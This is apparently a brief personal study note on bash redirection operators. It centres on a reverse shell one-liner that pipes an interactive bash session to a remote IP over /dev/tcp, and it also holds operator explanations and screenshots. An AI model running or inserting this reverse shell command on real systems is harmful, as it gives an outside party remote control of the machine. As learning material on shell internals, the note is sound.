## Redirect

```shell
$ bash -i &> /dev/tcp/10.3.0.13/222 0>&1
```

`&> file` == `> file 2>&1`

`0>&1` == `0<&1` or `<&1`



https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean

## Reverse Shell

### redirecting standard output

![image-20200526153528997](https://raw.githubusercontent.com/lc1838228782/pics/master/img/image-20200526153528997.png)

### redirect standard input & output

![image-20200526153551069](https://raw.githubusercontent.com/lc1838228782/pics/master/img/image-20200526153551069.png)

### redirecting standard error, input and output

![image-20200526153712173](https://raw.githubusercontent.com/lc1838228782/pics/master/img/image-20200526153712173.png)